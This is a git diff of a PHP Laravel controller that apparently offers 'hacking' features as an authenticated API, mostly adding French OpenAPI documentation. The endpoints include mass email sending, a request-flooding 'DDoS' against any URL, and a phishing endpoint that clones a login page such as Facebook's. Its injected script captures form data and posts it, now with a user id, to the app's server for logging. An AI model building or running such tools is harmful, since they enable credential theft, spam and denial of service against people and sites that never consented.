@@ -37,56 +37,64 @@ class HackController extends Controller
         }
     }
 
-
-
     /**
      * @OA\Get(
-     *     path="/emailChecker/{email}",
-     *     summary="Vérifier un email via l'API Hunter.io",
-     *     description="Cette méthode permet de vérifier un email en utilisant l'API Hunter.io pour obtenir son statut et son score.",
-     *     tags={"HackController"},
+     *     path="/api/emailChecker/{email}",
+     *     summary="Vérifie un email avec l'API Hunter.io",
+     *     description="Cette méthode vérifie si un email est valide et retourne un score de validité en utilisant l'API Hunter.io.",
+     *     operationId="emailChecker",
+     *     tags={"Hacking"},
+     *     security={{"bearerAuth": {}}},
      *     @OA\Parameter(
      *         name="email",
      *         in="path",
-     *         description="Adresse email à vérifier",
+     *         description="L'adresse email à vérifier",
      *         required=true,
-     *         @OA\Schema(type="string", format="email")
+     *         @OA\Schema(
+     *             type="string",
+     *             format="email"
+     *         )
      *     ),
      *     @OA\Response(
      *         response=200,
-     *         description="Email validé avec succès",
+     *         description="Résultat de la vérification de l'email",
      *         @OA\JsonContent(
-     *             @OA\Property(property="email", type="string"),
-     *             @OA\Property(property="score", type="string"),
-     *             @OA\Property(property="status", type="string")
+     *             type="object",
+     *             @OA\Property(property="email", type="string", description="Adresse email vérifiée"),
+     *             @OA\Property(property="score", type="string", description="Score de validité de l'email (en pourcentage)"),
+     *             @OA\Property(property="status", type="string", description="Statut de l'email ('valid', 'invalid', etc.)")
      *         )
      *     ),
      *     @OA\Response(
      *         response=400,
-     *         description="Email invalide ou erreur de l'API Hunter",
+     *         description="Erreur de validation de l'email ou erreur spécifique de l'API Hunter.io",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Détail de l'erreur")
      *         )
      *     ),
      *     @OA\Response(
      *         response=401,
      *         description="Utilisateur non authentifié",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur")
      *         )
      *     ),
      *     @OA\Response(
      *         response=403,
-     *         description="Accès interdit selon les règles de l'utilisateur",
+     *         description="Accès interdit à la ressource",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur")
      *         )
      *     ),
      *     @OA\Response(
      *         response=500,
      *         description="Erreur serveur",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur")
      *         )
      *     )
      * )
@@ -165,50 +173,62 @@ class HackController extends Controller
 
     /**
      * @OA\Post(
-     *     path="/spam",
-     *     summary="Envoyer des emails en masse",
-     *     description="Cette méthode permet d'envoyer un ou plusieurs emails à un destinataire spécifié.",
-     *     tags={"HackController"},
+     *     path="/api/spam",
+     *     summary="Envoie un ou plusieurs emails",
+     *     description="Cette méthode permet d'envoyer des emails en utilisant le service SMTP Gmail. Elle nécessite que l'utilisateur soit authentifié et dispose des permissions nécessaires.",
+     *     operationId="envoyerEmail",
+     *     tags={"Hacking"},
+     *     security={{"bearerAuth": {}}},
      *     @OA\RequestBody(
      *         required=true,
+     *         description="Données nécessaires pour envoyer un email",
      *         @OA\JsonContent(
+     *             type="object",
      *             required={"destinataire", "objet", "message", "nombreEmail"},
-     *             @OA\Property(property="destinataire", type="string", format="email"),
-     *             @OA\Property(property="objet", type="string"),
-     *             @OA\Property(property="message", type="string"),
-     *             @OA\Property(property="nombreEmail", type="integer")
+     *             @OA\Property(property="destinataire", type="string", format="email", description="Adresse email du destinataire"),
+     *             @OA\Property(property="objet", type="string", description="Sujet de l'email"),
+     *             @OA\Property(property="message", type="string", description="Contenu de l'email"),
+     *             @OA\Property(property="nombreEmail", type="integer", description="Nombre d'emails à envoyer")
      *         )
      *     ),
      *     @OA\Response(
      *         response=200,
-     *         description="Emails envoyés avec succès"
+     *         description="Email(s) envoyé(s) avec succès",
+     *         @OA\JsonContent(
+     *             type="boolean",
+     *             example=true
+     *         )
      *     ),
      *     @OA\Response(
      *         response=400,
-     *         description="Requête invalide",
+     *         description="Erreur de validation des données",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur")
      *         )
      *     ),
      *     @OA\Response(
      *         response=401,
      *         description="Utilisateur non authentifié",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur")
      *         )
      *     ),
      *     @OA\Response(
      *         response=403,
-     *         description="Accès interdit selon les règles de l'utilisateur",
+     *         description="Accès interdit à la ressource",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur")
      *         )
      *     ),
      *     @OA\Response(
      *         response=500,
-     *         description="Erreur serveur",
+     *         description="Erreur serveur ou problème d'envoi d'email",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur")
      *         )
      *     )
      * )
@@ -273,51 +293,28 @@ class HackController extends Controller
 
     /**
      * @OA\Post(
-     *     path="/check-password",
-     *     summary="Vérifier si un mot de passe est commun",
+     *     path="/api/check-password",
+     *     summary="Vérifie si un mot de passe est commun",
      *     description="Cette méthode permet de vérifier si le mot de passe fourni existe dans une liste de mots de passe courants.",
-     *     tags={"HackController"},
+     *     tags={"Hacking"},
+     *     security={{"bearerAuth": {}}},
      *     @OA\RequestBody(
      *         required=true,
      *         @OA\JsonContent(
      *             required={"password"},
-     *             @OA\Property(property="password", type="string")
+     *             @OA\Property(property="password", type="string", example="dragon")
      *         )
      *     ),
      *     @OA\Response(
      *         response=200,
-     *         description="Résultat de la vérification du mot de passe",
+     *         description="Mot de passe valide ou invalide",
      *         @OA\JsonContent(
-     *             @OA\Property(property="exists", type="boolean")
-     *         )
-     *     ),
-     *     @OA\Response(
-     *         response=400,
-     *         description="Mot de passe manquant ou mal formaté",
-     *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             @OA\Property(property="is_common", type="boolean", example=true)
      *         )
      *     ),
      *     @OA\Response(
      *         response=401,
-     *         description="Utilisateur non authentifié",
-     *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
-     *         )
-     *     ),
-     *     @OA\Response(
-     *         response=403,
-     *         description="Accès interdit selon les règles de l'utilisateur",
-     *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
-     *         )
-     *     ),
-     *     @OA\Response(
-     *         response=500,
-     *         description="Erreur serveur",
-     *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
-     *         )
+     *         description="Utilisateur non authentifié"
      *     )
      * )
      */
@@ -369,36 +366,42 @@ class HackController extends Controller
 
     /**
      * @OA\Get(
-     *     path="/passwordGenerator",
-     *     summary="Générer un mot de passe aléatoire",
-     *     description="Cette méthode permet de générer un mot de passe aléatoire pour l'utilisateur.",
-     *     tags={"HackController"},
+     *     path="/api/passwordGenerator",
+     *     summary="Génère un mot de passe aléatoire sécurisé",
+     *     description="Cette méthode génère un mot de passe aléatoire sécurisé de 16 caractères, comprenant des lettres, chiffres et symboles spéciaux. Elle nécessite une authentification et une autorisation.",
+     *     operationId="generatePassword",
+     *     tags={"Hacking"},
+     *     security={{"bearerAuth": {}}},
      *     @OA\Response(
      *         response=200,
      *         description="Mot de passe généré avec succès",
      *         @OA\JsonContent(
-     *             @OA\Property(property="password", type="string")
+     *             type="object",
+     *             @OA\Property(property="password", type="string", description="Mot de passe généré")
      *         )
      *     ),
      *     @OA\Response(
      *         response=401,
      *         description="Utilisateur non authentifié",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
      *         )
      *     ),
      *     @OA\Response(
      *         response=403,
-     *         description="Accès interdit selon les règles de l'utilisateur",
+     *         description="Accès interdit à la ressource",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
      *         )
      *     ),
      *     @OA\Response(
      *         response=500,
-     *         description="Erreur serveur",
+     *         description="Erreur interne lors de la génération ou de l'enregistrement du log",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
      *         )
      *     )
      * )
@@ -435,41 +438,61 @@ class HackController extends Controller
 
     /**
      * @OA\Get(
-     *     path="/subdomains/{domain}",
-     *     summary="Récupérer les sous-domaines d'un domaine",
-     *     description="Cette méthode permet de récupérer les sous-domaines d'un domaine en utilisant l'API SecurityTrails.",
-     *     tags={"HackController"},
+     *     path="/api/subdomains/{domain}",
+     *     summary="Récupère les sous-domaines d'un domaine",
+     *     description="Cette méthode permet de récupérer la liste des sous-domaines d'un domaine spécifié. L'utilisateur doit être authentifié et autorisé.",
+     *     operationId="getSubdomains",
+     *     tags={"Hacking"},
+     *     security={{"bearerAuth": {}}},
      *     @OA\Parameter(
      *         name="domain",
      *         in="path",
-     *         description="Nom du domaine",
      *         required=true,
-     *         @OA\Schema(type="string")
+     *         description="Le domaine pour lequel récupérer les sous-domaines",
+     *         @OA\Schema(
+     *             type="string"
+     *         )
      *     ),
      *     @OA\Response(
      *         response=200,
-     *         description="Liste des sous-domaines récupérée avec succès",
-     *         @OA\JsonContent(type="array", items=@OA\Items(type="string"))
+     *         description="Sous-domaines récupérés avec succès",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="subdomains", type="array", items={
+     *                 @OA\Items(type="string")
+     *             }, description="Liste des sous-domaines du domaine")
+     *         )
      *     ),
      *     @OA\Response(
      *         response=401,
      *         description="Utilisateur non authentifié",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
      *         )
      *     ),
      *     @OA\Response(
      *         response=403,
-     *         description="Accès interdit selon les règles de l'utilisateur",
+     *         description="Accès interdit à la ressource",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
      *         )
      *     ),
      *     @OA\Response(
      *         response=500,
-     *         description="Erreur serveur",
+     *         description="Erreur interne lors de l'enregistrement du log ou de la récupération des sous-domaines",
      *         @OA\JsonContent(
-     *             @OA\Property(property="error", type="string")
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=400,
+     *         description="Domaine invalide",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Le domaine spécifié est invalide.")
      *         )
      *     )
      * )
@@ -522,6 +545,72 @@ class HackController extends Controller
         ], $response->status());
     }
 
+
+    /**
+     * @OA\Post(
+     *     path="/api/ddos",
+     *     summary="Effectue une attaque DDoS simulée",
+     *     description="Cette méthode permet de simuler une attaque DDoS en envoyant un nombre défini de requêtes HTTP à une URL spécifiée. L'utilisateur doit être authentifié et autorisé à effectuer cette action.",
+     *     operationId="ddos",
+     *     tags={"Hacking"},
+     *     security={{"bearerAuth": {}}},
+     *     @OA\RequestBody(
+     *         required=true,
+     *         description="Les données nécessaires pour simuler l'attaque DDoS",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             required={"url", "count"},
+     *             @OA\Property(property="url", type="string", format="uri", description="L'URL cible de l'attaque"),
+     *             @OA\Property(property="count", type="integer", description="Le nombre de requêtes à envoyer pour simuler l'attaque", example=10)
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=200,
+     *         description="Réponse des requêtes DDoS",
+     *         @OA\JsonContent(
+     *             type="array",
+     *             @OA\Items(
+     *                 type="object",
+     *                 @OA\Property(property="request_number", type="integer", description="Numéro de la requête envoyée"),
+     *                 @OA\Property(property="http_code", type="integer", description="Code HTTP retourné"),
+     *                 @OA\Property(property="response", type="string", description="Réponse du serveur")
+     *             )
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=400,
+     *         description="Paramètres invalides",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Les paramètres fournis sont invalides.")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=401,
+     *         description="Utilisateur non authentifié",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=403,
+     *         description="Accès interdit à la ressource",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=500,
+     *         description="Erreur interne lors de l'enregistrement du log ou de l'exécution de la requête",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
+     *         )
+     *     )
+     * )
+     */
     public function ddos(Request $request)
     {
 
@@ -573,6 +662,51 @@ class HackController extends Controller
         return response()->json($responses);
     }
 
+    /**
+     * @OA\Get(
+     *     path="/api/generate-identity",
+     *     summary="Génère une identité fictive aléatoire",
+     *     description="Cette méthode génère une identité fictive aléatoire incluant un nom, un email, une adresse et un numéro de téléphone. L'utilisateur doit être authentifié et autorisé à effectuer cette action.",
+     *     operationId="generateIdentity",
+     *     tags={"Hacking"},
+     *     security={{"bearerAuth": {}}},
+     *     @OA\Response(
+     *         response=200,
+     *         description="Identité générée avec succès",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="name", type="string", description="Nom généré"),
+     *             @OA\Property(property="email", type="string", description="Email généré"),
+     *             @OA\Property(property="address", type="string", description="Adresse générée"),
+     *             @OA\Property(property="phone", type="string", description="Numéro de téléphone généré")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=401,
+     *         description="Utilisateur non authentifié",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=403,
+     *         description="Accès interdit à la ressource",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=500,
+     *         description="Erreur interne lors de l'enregistrement du log",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
+     *         )
+     *     )
+     * )
+     */
     public function generateIdentity()
     {
         // Récupérer l'utilisateur authentifié
@@ -610,6 +744,58 @@ class HackController extends Controller
         return response()->json($fakeIdentity);
     }
 
+
+    /**
+     * @OA\Post(
+     *     path="/api/phishing",
+     *     summary="Effectue une attaque de type phishing sur un site",
+     *     description="Cette méthode permet de récupérer le contenu HTML d'un site donné, d'y injecter un script de phishing et de le renvoyer modifié. L'utilisateur doit être authentifié et autorisé à effectuer cette action.",
+     *     operationId="phishing",
+     *     tags={"Hacking"},
+     *     security={{"bearerAuth": {}}},
+     *     @OA\RequestBody(
+     *         required=true,
+     *         description="Objet JSON contenant l'adresse du site à analyser",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             required={"adresse"},
+     *             @OA\Property(property="adresse", type="string", example="https://www.facebook.com/login", description="URL du site à analyser pour l'attaque de phishing")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=200,
+     *         description="Contenu HTML modifié avec succès et script injecté",
+     *         @OA\JsonContent(
+     *             type="string",
+     *             description="HTML du site avec le script de phishing injecté"
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=401,
+     *         description="Utilisateur non authentifié",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=403,
+     *         description="Accès interdit à la ressource",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=500,
+     *         description="Erreur interne lors de l'analyse ou de l'injection du script",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
+     *         )
+     *     )
+     * )
+     */
     public function phishing(Request $request)
     {
         // Vérifier que l'utilisateur est authentifié
@@ -686,7 +872,7 @@ class HackController extends Controller
                         headers: {
                             'Content-Type': 'application/json',
                         },
-                        body: JSON.stringify({data: formDataObj}) // Envoi de l'objet formData en tant que JSON
+                        body: JSON.stringify({data: formDataObj, user_id:$user->id}) // Envoi de l'objet formData en tant que JSON
                     })
                     .then(response => {
                         if (!response.ok) {
@@ -739,12 +925,13 @@ class HackController extends Controller
         // Valider les données envoyées (en fonction des champs que vous attendez dans le formulaire)
         $request->validate([
             'data' => 'required|array', // Assurez-vous que les données sont bien un tableau
+            'user_id' => 'required|integer', // Assurez-vous que l'ID de l'utilisateur est un entier
         ]);
 
         try {
             // Enregistrer les données dans la table des logs
             Log::create([
-                'utilisateur_id' => null, // L'ID de l'utilisateur
+                'utilisateur_id' => $request->user_id, // L'ID de l'utilisateur
                 'fonctionnalite_id' => 13,      // ID de la fonctionnalité associée (à personnaliser selon votre logique)
                 'description_action' => 'Enregistrement de données : ' . json_encode($request->data), // Enregistrer les données sous forme de texte
             ]);
@@ -757,6 +944,48 @@ class HackController extends Controller
         }
     }
 
+
+    /**
+     * @OA\Get(
+     *     path="/api/getRandomPerson",
+     *     summary="Génère une image d'une personne aléatoire",
+     *     description="Cette méthode génère une image d'une personne aléatoire en récupérant une photo depuis le site https://thispersondoesnotexist.com. Elle nécessite une authentification et une autorisation.",
+     *     operationId="getRandomPerson",
+     *     tags={"Hacking"},
+     *     security={{"bearerAuth": {}}},
+     *     @OA\Response(
+     *         response=200,
+     *         description="Image de la personne aléatoire générée avec succès",
+     *         @OA\MediaType(
+     *             mediaType="image/jpeg"
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=401,
+     *         description="Utilisateur non authentifié",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=403,
+     *         description="Accès interdit à la ressource",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=500,
+     *         description="Erreur interne lors de la génération ou de l'enregistrement du log",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
+     *         )
+     *     )
+     * )
+     */
     public function getRandomPerson()
     {
         //ce site genere des personnes aleatoires https://thispersondoesnotexist.com/ retourne la dans la reponse, et loguer l'action
@@ -787,7 +1016,59 @@ class HackController extends Controller
         return response($response->body())->header('Content-Type', 'image/jpeg');
     }
 
-
+    /**
+     * @OA\Post(
+     *     path="/api/crawlerInformation",
+     *     summary="Récupère des informations via un moteur de recherche externe",
+     *     description="Cette méthode effectue une recherche via l'API SerpApi, et récupère des informations basées sur la requête fournie. Elle nécessite une authentification et une autorisation appropriée.",
+     *     operationId="crawlerInformation",
+     *     tags={"Hacking"},
+     *     security={{"bearerAuth": {}}},
+     *     @OA\RequestBody(
+     *         required=true,
+     *         @OA\MediaType(
+     *             mediaType="application/json",
+     *             @OA\Schema(
+     *                 type="object",
+     *                 required={"search"},
+     *                 @OA\Property(property="search", type="string", example="Laravel tutorial")
+     *             )
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=200,
+     *         description="Données récupérées et enregistrées avec succès",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="result", type="object", description="Les résultats de la recherche récupérés depuis SerpApi")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=401,
+     *         description="Utilisateur non authentifié",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=403,
+     *         description="Accès interdit à la ressource",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=500,
+     *         description="Erreur interne lors de la récupération ou de l'enregistrement des données",
+     *         @OA\JsonContent(
+     *             type="object",
+     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
+     *         )
+     *     )
+     * )
+     */
     public function crawlerInformation(Request $request)
     {
 
@@ -827,7 +1108,7 @@ class HackController extends Controller
                 ]);
 
                 // Retourner une réponse JSON confirmant l'enregistrement
-                return response()->json(['success' => 'Données enregistrées avec succès'], 200);
+                return response()->json(['result' => $result], 200);
             } catch (\Exception $e) {
                 // Gérer les erreurs
                 return response()->json(['error' => 'Erreur lors de l\'enregistrement des données : ' . $e->getMessage()], 500);
